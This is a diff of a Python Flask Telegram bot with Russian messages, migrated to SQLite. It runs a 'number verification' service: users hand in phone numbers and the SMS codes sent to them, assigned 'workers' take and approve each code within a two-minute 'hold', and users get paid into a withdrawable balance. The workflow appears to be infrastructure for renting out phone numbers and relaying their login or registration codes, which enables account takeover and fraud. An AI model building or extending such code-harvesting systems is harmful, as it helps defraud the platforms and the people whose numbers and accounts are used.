+            # Добавляем транзакцию вывода (уже заблокирована)
+            db_query("INSERT INTO transactions (user_id, amount, type, description, created_at) VALUES (?, ?, 'withdraw_completed', ?, ?)",
+                     (target_user, -amount, f"Вывод {amount}₽ подтверждён", datetime.now().isoformat()))
+            
+            отправить(target_user, f"✅ <b>ВЫВОД ПОДТВЕРЖДЁН!</b>\n\n💰 Сумма: {amount}₽\n💸 Средства отправлены на указанный кошелёк.\n\nСпасибо за использование сервиса!")
+            отправить(user_id, f"✅ <b>ВЫВОД ПОДТВЕРЖДЁН</b>\n\n👤 Пользователю @{cb_data} выплачено {amount}₽")
             return "ok", 200
         
         # Обработка заявок воркеров
-        if юзер not in WORKERS and юзер != ADMIN:
+        if user_id not in WORKERS and user_id != ADMIN:
             return "ok", 200
         
-        действие, тикет = данные_кн.split("_")
-        тикет = int(тикет)
-        if тикет not in заявки:
-            return "ok", 200
+        action, req_id = cb_data.split("_")
+        req_id = int(req_id)
         
         # Взять заявку
-        if действие == "взять":
-            if заявки[тикет]["status"] != "новая":
-                отправить(юзер, f"❌ Заявка #{тикет} уже недоступна", заменить=True)
+        if action == "take":
+            req = db_query("SELECT status FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
+            if not req or req[0] != "new":
+                отправить(user_id, f"❌ <b>ЗАЯВКА #{req_id} УЖЕ НЕДОСТУПНА</b>\n\nЕё уже взял другой воркер.", заменить=True)
                 return "ok", 200
             
-            заявки[тикет]["worker"] = юзер
-            заявки[тикет]["status"] = "код_запрошен"
-            if юзер in воркеры:
-                воркеры[юзер]["status"] = "busy"
-                воркеры[юзер]["current"] = тикет
+            # Назначаем воркера
+            db_query("UPDATE verify_requests SET worker_id = ?, status = 'code_requested' WHERE id = ?", (user_id, req_id))
+            db_query("UPDATE workers SET status = 'busy', current_request_id = ? WHERE user_id = ?", (req_id, user_id))
             
-            заявки[заявки[тикет]["user"]]["state"] = "waiting_code"
-            заявки[заявки[тикет]["user"]]["current"] = тикет
-            отправить(заявки[тикет]["user"], "🔑 Воркер принял заявку! Введи код из SMS (4 цифры):")
-            отправить(юзер, f"✅ ТЫ ВЗЯЛ ЗАЯВКУ #{тикет}!\n📞 Телефон: {заявки[тикет]['phone']}\n⏳ Жди код от пользователя...", кнопки_заявки(тикет, "код_запрошен"))
+            # Получаем данные заявки
+            req_data = db_query("SELECT user_id, phone FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
+            target_user = req_data[0]
+            phone = req_data[1]
+            
+            текущие_состояния[target_user] = {"state": "waiting_code", "request_id": req_id}
+            
+            отправить(target_user, f"🔑 <b>ВОРКЕР ВЗЯЛ ВАШУ ЗАЯВКУ #{req_id}</b>\n\n📞 Телефон: {phone}\n\n<b>Введите код из SMS (4 цифры):</b>")
+            отправить(user_id, f"✅ <b>ВЫ ВЗЯЛИ ЗАЯВКУ #{req_id}</b>\n\n📞 Телефон: {phone}\n⏳ Ожидайте код от пользователя...", кнопки_заявки(req_id, "code_requested"))
             
             # Уведомить остальных воркеров
-            for wid, w in воркеры.items():
-                if w.get("status") == "free" and wid != юзер:
-                    отправить(wid, f"❌ Заявка #{тикет} уже взята другим воркером", заменить=True)
+            other_workers = db_query("SELECT user_id FROM workers WHERE status = 'free' AND user_id != ?", (user_id,), fetchall=True)
+            for w in other_workers:
+                отправить(w[0], f"❌ <b>ЗАЯВКА #{req_id} УЖЕ ВЗЯТА</b>", заменить=True)
             return "ok", 200
         
-        # Принять код → ХОЛД 2 минуты
-        if действие == "принять":
-            if заявки[тикет]["status"] != "код_получен":
-                отправить(юзер, "⏳ Код ещё не введён пользователем")
+        # Принять код и запустить холд
+        if action == "approve":
+            req = db_query("SELECT status, user_id FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
+            if not req or req[0] != "code_received":
+                отправить(user_id, "⏳ <b>КОД ЕЩЁ НЕ ВВЕДЁН</b>\n\nПользователь ещё не ввёл код.", заменить=True)
                 return "ok", 200
             
-            заявки[тикет]["status"] = "холд"
-            отправить(заявки[тикет]["user"], "✅ Код подтверждён! ХОЛД 2 МИНУТЫ", заменить=True)
-            отправить(юзер, f"✅ Код подтверждён! ЗАПУЩЕН ХОЛД 2 МИНУТЫ\n⏰ Нажми «ВЫПЛАТИТЬ» в течение 2 минут.", кнопки_заявки(тикет, "холд"))
+            # Ставим холд
+            db_query("UPDATE verify_requests SET status = 'hold' WHERE id = ?", (req_id,))
+            отправить(req[1], "✅ <b>КОД ПОДТВЕРЖДЁН!</b>\n\n🕐 СТАТУС: <b>ХОЛД 2 МИНУТЫ</b>\n\nОжидайте выплаты.", заменить=True)
+            отправить(user_id, f"✅ <b>КОД ПОДТВЕРЖДЁН!</b>\n\n🕐 ЗАПУЩЕН ХОЛД 2 МИНУТЫ\n\n<b>Нажмите «ВЫПЛАТИТЬ» в течение 2 минут.</b>", кнопки_заявки(req_id, "hold"))
             
             # Таймер на 2 минуты
-            def слет():
-                if тикет in заявки and заявки[тикет]["status"] == "холд":
-                    заявки[тикет]["status"] = "слет"
-                    отправить(заявки[тикет]["user"], "⏰ ВРЕМЯ ИСТЕКЛО! Заявка отменена.", заменить=True)
-                    отправить(юзер, f"⏰ ХОЛД ПО ЗАЯВКЕ #{тикет} ИСТЁК!\nЗаявка отменена.")
-                    if юзер in воркеры:
-                        воркеры[юзер]["status"] = "free"
-                        воркеры[юзер]["current"] = None
-            threading.Timer(120, слет).start()
+            def expire():
+                req_check = db_query("SELECT status FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
+                if req_check and req_check[0] == "hold":
+                    db_query("UPDATE verify_requests SET status = 'expired' WHERE id = ?", (req_id,))
+                    db_query("UPDATE workers SET status = 'free', current_request_id = NULL WHERE user_id = ?", (user_id,))
+                    user_data = db_query("SELECT user_id FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
+                    if user_data:
+                        отправить(user_data[0], "⏰ <b>ВРЕМЯ ИСТЕКЛО!</b>\n\nЗаявка отменена.", заменить=True)
+                    отправить(user_id, f"⏰ <b>ХОЛД ПО ЗАЯВКЕ #{req_id} ИСТЁК!</b>\n\nЗаявка отменена.")
+            threading.Timer(120, expire).start()
             return "ok", 200
         
-        # Выплатить (после холда)
-        if действие == "платить":
-            if заявки[тикет]["status"] != "холд":
-                отправить(юзер, "❌ Заявка не в статусе холда")
+        # Выплатить
+        if action == "pay":
+            req = db_query("SELECT status, user_id, reward FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
+            if not req or req[0] != "hold":
+                отправить(user_id, "❌ <b>ЗАЯВКА НЕ В СТАТУСЕ ХОЛДА</b>", заменить=True)
                 return "ok", 200
             
-            заявки[тикет]["status"] = "оплачено"
+            # Завершаем заявку
+            db_query("UPDATE verify_requests SET status = 'completed', completed_at = ? WHERE id = ?", (datetime.now().isoformat(), req_id))
+            db_query("UPDATE workers SET status = 'free', current_request_id = NULL, total_completed = total_completed + 1, total_earned = total_earned + ? WHERE user_id = ?", (req[2], user_id))
             
             # Начисляем деньги пользователю
-            обновить_баланс(заявки[тикет]["user"], 50, f"Верификация номера {заявки[тикет]['phone']} (заявка #{тикет})")
+            обновить_баланс(req[1], req[2], f"Верификация номера (заявка #{req_id})", "verification")
             
-            отправить(заявки[тикет]["user"], f"✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n💰 Начислено 50₽\nТвой баланс: {пользователи[заявки[тикет]['user']]['balance']}₽", заменить=True)
-            отправить(юзер, f"✅ ВЫПЛАТА ПО ЗАЯВКЕ #{тикет} ПРОИЗВЕДЕНА!\n💰 Пользователю начислено 50₽")
+            # Добавляем телефон в список верифицированных
+            phone = db_query("SELECT phone FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)[0]
+            db_query("INSERT OR IGNORE INTO phones (phone, user_id, verified_at) VALUES (?, ?, ?)", (phone, req[1], datetime.now().isoformat()))
             
-            if юзер in воркеры:
-                воркеры[юзер]["status"] = "free"
-                воркеры[юзер]["current"] = None
+            # Уведомления
+            new_balance = db_query("SELECT balance FROM users WHERE user_id = ?", (req[1],), fetchone=True)[0]
+            отправить(req[1], f"✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n💰 <b>Начислено:</b> {req[2]}₽\n💎 <b>Ваш баланс:</b> {new_balance}₽\n\nСпасибо за использование сервиса!", заменить=True)
+            отправить(user_id, f"✅ <b>ВЫПЛАТА ПО ЗАЯВКЕ #{req_id} ПРОИЗВЕДЕНА!</b>\n\n💰 Пользователю начислено {req[2]}₽")
             return "ok", 200
         
         # Отказ
-        if действие == "отказ":
-            заявки[тикет]["status"] = "отказ"
-            отправить(заявки[тикет]["user"], "❌ ЗАЯВКА ОТКЛОНЕНА", заменить=True)
-            отправить(юзер, f"❌ Заявка #{тикет} отклонена")
-            if юзер in воркеры:
-                воркеры[юзер]["status"] = "free"
-                воркеры[юзер]["current"] = None
+        if action == "reject":
+            req = db_query("SELECT user_id FROM verify_requests WHERE id = ?", (req_id,), fetchone=True)
+            if req:
+                db_query("UPDATE verify_requests SET status = 'rejected' WHERE id = ?", (req_id,))
+                db_query("UPDATE workers SET status = 'free', current_request_id = NULL WHERE user_id = ?", (user_id,))
+                отправить(req[0], "❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nПопробуйте создать новую заявку.", заменить=True)
+                отправить(user_id, f"❌ <b>ЗАЯВКА #{req_id} ОТКЛОНЕНА</b>")
             return "ok", 200
     
     return "ok", 200
 
 @app.route("/")
-def домой():
-    return "Бот с холдом и балансом работает", 200
+def home():
+    return "✅ Бот работает!", 200
 
 if __name__ == "__main__":
-    # Регистрируем воркеров
+    init_db()
+    
+    # Регистрируем воркеров из списка
     for wid in WORKERS:
-        if wid not in воркеры:
-            воркеры[wid] = {"status": "free", "current": None, "name": "", "username": ""}
+        exists = db_query("SELECT user_id FROM workers WHERE user_id = ?", (wid,), fetchone=True)
+        if not exists:
+            db_query("INSERT INTO workers (user_id, status, registered_at) VALUES (?, 'free', ?)", (wid, datetime.now().isoformat()))
     
     # Устанавливаем вебхук
-    хост = os.environ.get("RENDER_EXTERNAL_HOSTNAME")
-    if хост:
-        вебхук_урл = f"https://{хост}/{TOKEN}"
+    host = os.environ.get("RENDER_EXTERNAL_HOSTNAME")
+    if host:
+        webhook_url = f"https://{host}/{TOKEN}"
         requests.post(URL + "deleteWebhook")
-        requests.post(URL + "setWebhook", data={"url": вебхук_урл})
-        print(f"✅ Вебхук: {вебхук_урл}")
+        requests.post(URL + "setWebhook", data={"url": webhook_url})
+        print(f"✅ Webhook: {webhook_url}")
     
     app.run(host="0.0.0.0", port=10000)
